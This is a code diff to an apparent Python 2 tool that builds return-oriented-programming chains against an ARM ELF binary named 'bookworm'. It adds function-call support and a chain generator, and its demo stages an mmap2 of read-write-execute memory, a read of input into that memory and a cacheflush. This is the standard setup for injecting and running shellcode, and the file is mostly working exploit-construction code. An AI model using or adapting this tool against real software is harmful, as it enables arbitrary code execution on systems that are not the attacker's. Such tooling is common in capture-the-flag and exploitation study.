@@ -3,6 +3,7 @@ import arm
 import pyelf
 import sys
 import struct
+import random
 
 p32 = lambda x: struct.pack("<L", x)
 
@@ -31,6 +32,7 @@ class ROP:
         self.find_ldmias()
         self.find_syscall_gadget()
         self.ropchain = []
+        random.shuffle(self.gadgets)
 
     def find_pops(self):
         self.pops = filter(
@@ -58,14 +60,14 @@ class ROP:
 
     def find_best_gadget(self, regs):
         def gadget_score(gadget, regs):
-            return len(set(gadget) & regs)
+            return len(set(gadget) - regs)
         #must contain atleast one register we want.
         gadgets = ((a,g) for (a,g) in self.gadgets if len(set(g) & regs) > 0)
-        gadget = max(gadgets, key = lambda (a, g): gadget_score(g, regs))
+        gadget = min(gadgets, key = lambda (a, g): gadget_score(g, regs))
         return gadget
 
 
-    def set_regs(self, **regs_dict):
+    def set_regs(self, regs_dict, return_addr):
         regs_dict = dict_keys_upper(regs_dict)
         ropchain = []
         regs = set(regs_dict.keys())
@@ -78,39 +80,69 @@ class ROP:
             old_regs = set(regs)
             regs -= set(reg_pops)
 
+        ropchain += [return_addr]
         if regs:
             raise Exception("Unable to set registers %r from %r" % (regs, regs_dict))
 
-        return ropchain
+        return ropchain[0], ropchain[1:]
 
-    def do_swi(self, **regs_dict):
-        regs_dict = dict_keys_upper(regs_dict)
+    def do_swi(self, return_addr):
+        if return_addr == None:
+            return_addr = 0x41414141
+        regs_dict= {"R15" : return_addr}
         ropchain = []
         if self.swi_0 == None:
-            raise Exception("SWI 0 gadget not found, Cannot not perform syscall")
+            raise Exception("SWI 0 gadget not found. Cannot not perform syscall")
         addr, pop_inst = self.swi_0
         ropchain.append(addr | 1)
-        ropchain += [regs_dict.get(reg, 0x41414141) for reg in pop_inst[1][:-1]]
-        return ropchain
+        ropchain += [regs_dict.get(reg, 0x41414141) for reg in pop_inst[1]]
+        return ropchain[0], ropchain[1:]
 
-    def do_syscall(self, **regs_dict):
-        regs_dict = dict_keys_upper(regs_dict)
-        ropchain = self.set_regs(**regs_dict)
-        ropchain += self.do_swi()
-        return ropchain
+    def lookup_symbol(self, name):
+        raise Exception("Symbol lookup not implemented yet. Doit yourself.")
 
-    def syscall(self, **regs_dict):
+    def call(self, func, *args):
+        if type(func) == str:
+            func = self.lookup_symbol(func)
+        regs_dict = dict(zip(["R0", "R1", "R2", "R3"], args))
+        self.ropchain.append(("call", regs_dict, func))
+
+    def do_syscall(self, regs_dict, return_addr):
+        swi_addr, swirop = self.do_swi(return_addr)
+        set_regs_addr, regsrop = self.set_regs(regs_dict, swi_addr)
+        return set_regs_addr, (regsrop + swirop)
+
+    def syscall(self, regs_dict):
         regs_dict = dict_keys_upper(regs_dict)
-        self.ropchain += self.do_syscall(**regs_dict)
+        self.ropchain.append(("syscall", regs_dict))
+
+    def generate_ropchain(self):
+        return_addr = None
+        regs = set()
+        rop = []
+        roppart = []
+        for i in self.ropchain[::-1]:
+            regs_dict = i[1]
+            if i[0] == "syscall":
+                return_addr, roppart = self.do_syscall(regs_dict, return_addr)
+            if i[0] == "call":
+                if return_addr:
+                    regs_dict["R14"] = return_addr
+                return_addr, roppart = self.set_regs(regs_dict, i[2])
+            rop = roppart+rop
+        rop = [return_addr] + rop
+        return rop
 
     def flush(self):
-        ropchain = "".join(map(p32, self.ropchain))
+        ropchain = "".join(map(p32, self.generate_ropchain()))
         self.ropchain = []
         return ropchain
 
 if __name__ == "__main__":
     rop = ROP("bookworm")
-    rop.syscall(R0=0xaa0000, R1=0x1000, R2=7, R3=0x32, R4=0xffffffff, R5=0, R7=192)
-    rop.syscall(R0=0, R1=0xaa0000, R2=0x142, R7=3)
-    rop.syscall(R7=0xf0002)
-    print map(hex, rop.ropchain)
+    rop.syscall({"R0":0xaa0000, "R1":0x1000, "R2":7, "R3":0x32, "R4":0xffffffff, "R5":0, "R7":192})
+    rop.call(0x45454545, 0x11111111, 0x22222222, 0x55555555)
+    rop.syscall({"R0":0, "R1":0xaa0000, "R2":0x142, "R7":3})
+    rop.call(0xaaaaaaaa, 0x1e1e1e1e, 0x42424242, 0x99995555)
+    rop.syscall({"R7":0xf0002})
+    print map(hex, rop.generate_ropchain())
